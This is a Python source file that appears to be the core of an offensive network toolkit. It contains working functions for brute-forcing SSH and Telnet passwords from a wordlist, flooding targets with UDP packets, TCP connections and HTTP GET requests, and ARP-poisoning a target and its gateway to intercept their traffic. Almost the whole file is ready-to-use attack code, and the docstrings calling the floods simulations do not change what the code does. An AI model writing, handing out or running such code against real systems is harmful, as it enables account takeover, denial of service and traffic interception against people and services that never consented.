import paramiko
import asyncio
import telnetlib3
import time
import socket
import random
import platform
import subprocess
import threading
import re
from scapy.all import ARP, Ether, srp, send, sniff, conf, getmacbyip

# Global ARP Control
spoofing_active = False
spoof_thread = None

def check_target(target, port):
    """
    Analyzes the target to see if it's up and if the port allows traffic.
    Returns a dictionary with status details.
    """
    analysis = {
        "host_status": "DOWN",
        "port_status": "UNKNOWN",
        "firewall_detected": False,
        "message": ""
    }
    
    # 1. Ping Check (Host Reachability)
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', target]
    
    try:
        response = subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if response == 0:
            analysis["host_status"] = "UP"
        else:
            analysis["host_status"] = "DOWN (or ignoring ICMP)"
            analysis["firewall_detected"] = True
    except Exception:
        pass
        
    # 2. Port Check (Simple Connectivity)
    # For UDP, it's hard to know if it's open without an application response, 
    # but we can check if it's explicitly rejected (ICMP Unreachable)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        sock.sendto(b'test', (target, int(port)))
        
        # In UDP, we might not get anything back even if open. 
        # But if we get a connection refused/unreachable error, it's closed/rejected.
        try:
             data, _ = sock.recvfrom(1024)
             analysis["port_status"] = "OPEN (Responding)"
        except socket.timeout:
             if analysis["host_status"] == "UP":
                 analysis["port_status"] = "OPEN|FILTERED (No Response)"
             else:
                 analysis["port_status"] = "UNKNOWN"
        except ConnectionRefusedError:
             analysis["port_status"] = "CLOSED (Refused)"
             
        sock.close()
    except Exception as e:
        analysis["message"] = str(e)
        
    return analysis

def brute_force_ssh(target, username, password_list, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            client.connect(target, port=port, username=username, password=password, timeout=3)
            # If successful
            success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
            results.append({"status": "success", "password": password, "message": success_msg})
            client.close()
            return results # Stop after finding one
        except paramiko.AuthenticationException:
            # results.append({"status": "fail", "password": password, "message": "Authentication failed"})
            pass
        except Exception as e:
            # Log connection errors for debugging
            print(f"[ERROR] SSH Connection failed: {e}")
            pass
            
    client.close()
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

async def telnet_login_check(target, port, username, password):
    try:
        reader, writer = await asyncio.wait_for(telnetlib3.open_connection(target, port), timeout=5)
        
        # Read initial banner until login prompt
        # Note: Prompts vary, some systems send "Login:" others "login:"
        await asyncio.wait_for(reader.readuntil("ogin:"), timeout=5) 
        writer.write(username + "\n")
        
        # Read until password
        await asyncio.wait_for(reader.readuntil("assword:"), timeout=5)
        writer.write(password + "\n")
        
        # Check result
        # Read a bit to see if we get a shell prompt or error
        response = await asyncio.wait_for(reader.read(1024), timeout=5)
        
        writer.close()
        
        if "Login incorrect" not in response and "failed" not in response:
            return True
        return False
    except Exception as e:
        # print(f"Telnet Error: {e}")
        return False

def brute_force_telnet(target, username, password_list, port=23):
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            # Create a new event loop for each attempt to avoid "loop is closed" issues in this sync function context
            # Or just use asyncio.run which handles a fresh loop
            is_success = asyncio.run(telnet_login_check(target, port, username, password))
            
            if is_success:
                 success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
                 results.append({"status": "success", "password": password, "message": success_msg})
                 return results
                 
        except Exception as e:
            print(f"Telnet Attempt Error: {e}")
            pass
            
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

def udp_flood(target, port, duration, packet_size=1024):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate random payload of specified size
    bytes_to_send = random._urandom(min(packet_size, 65500)) 
    timeout = time.time() + duration
    sent = 0

    try:
        while time.time() < timeout:
            client.sendto(bytes_to_send, (target, port))
            sent += 1
            
        return {"status": "success", "message": f"UDP Flood finished. Sent {sent} packets ({packet_size} bytes each) to {target}:{port} in {duration}s."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def tcp_flood(target, port, duration):
    """
    Simulates a TCP Connect Flood. 
    Rapidly opens connections to the target to exhaust its connection table.
    """
    timeout = time.time() + duration
    sent = 0
    
    try:
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.close()
                sent += 1
            except:
                pass
                
        return {"status": "success", "message": f"TCP Flood finished. Attempted {sent} connections to {target}:{port} in {duration}s."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def http_flood(target, port, duration):
    """
    Simulates an HTTP Flood (Layer 7).
    Sends rapid GET requests to the target web server.
    """
    timeout = time.time() + duration
    sent = 0
    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nConnection: keep-alive\r\n\r\n".encode()
    
    try:
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.sendall(payload)
                s.close()
                sent += 1
            except:
                pass
                
        return {"status": "success", "message": f"HTTP Flood finished. Sent {sent} requests to {target}:{port} in {duration}s."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# --- ARP SPOOFING MODULE ---

def get_mac(ip):
    """
    Returns MAC address of a given IP. 
    Tries multiple methods for robustness.
    """
    try:
        # Method 1: Scapy's built-in function (fastest, uses cache)
        mac = getmacbyip(ip)
        if mac:
            return mac
            
        # Method 2: Manual ARP Request (srp)
        # Create ARP Request
        arp_req = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_req
        
        # Send
        result = srp(packet, timeout=2, verbose=False)[0]
        
        if result:
            return result[0][1].hwsrc
            
        # Method 3: System ARP Table (Windows "arp -a")
        # Useful if firewall blocks incoming ARP replies but OS sees them
        if platform.system().lower() == "windows":
            output = subprocess.check_output(f"arp -a {ip}", shell=True).decode()
            # Regex to find MAC: xx-xx-xx... or xx:xx:xx...
            mac_search = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
            if mac_search:
                return mac_search.group(0).replace('-', ':')
                
        return None
    except Exception as e:
        print(f"[!] get_mac error for {ip}: {e}")
        return None

def arp_spoof_loop(target_ip, target_mac, gateway_ip, gateway_mac):
    global spoofing_active
    
    print(f"[+] Starting ARP Spoof Loop. Target: {target_ip} ({target_mac}) <-> Gateway: {gateway_ip} ({gateway_mac})")
    
    try:
        while spoofing_active:
            # Tell Target that I am Gateway
            if target_mac:
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                send(packet1, verbose=False)
            
            # Tell Gateway that I am Target
            if gateway_mac:
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                send(packet2, verbose=False)
            
            time.sleep(2)
    except Exception as e:
        print(f"[-] Error in ARP loop: {e}")

def start_arp_spoof(target_ip, gateway_ip):
    global spoofing_active, spoof_thread
    
    if spoofing_active:
        return {"status": "error", "message": "ARP Spoofing is already active."}
    
    # Resolve MACs BEFORE starting thread
    print(f"[*] Resolving MACs for {target_ip} and {gateway_ip}...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac:
        return {"status": "error", "message": f"Could not find MAC for Target {target_ip}. Is it reachable?"}
    
    if not gateway_mac:
        return {"status": "error", "message": f"Could not find MAC for Gateway {gateway_ip}. Is it reachable?"}
        
    spoofing_active = True
    spoof_thread = threading.Thread(target=arp_spoof_loop, args=(target_ip, target_mac, gateway_ip, gateway_mac), daemon=True)
    spoof_thread.start()
    
    return {"status": "success", "message": f"ARP Poisoning started on {target_ip} <-> {gateway_ip}"}

def stop_arp_spoof(target_ip, gateway_ip):
    global spoofing_active, spoof_thread
    
    if not spoofing_active:
         return {"status": "error", "message": "No active ARP Attack."}
         
    spoofing_active = False
    if spoof_thread:
        spoof_thread.join(timeout=3)
        spoof_thread = None
        
    # Restore
    restore_arp(target_ip, gateway_ip)
    return {"status": "success", "message": "ARP Poisoning stopped. Network restored."}

def restore_arp(target_ip, gateway_ip):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            # Restore Target: Tell it the real Gateway MAC
            packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
            send(packet1, count=4, verbose=False)
            
            # Restore Gateway: Tell it the real Target MAC
            packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
            send(packet2, count=4, verbose=False)
            print("[+] ARP Tables Restored.")
    except Exception as e:
        print(f"[-] Error restoring ARP: {e}")
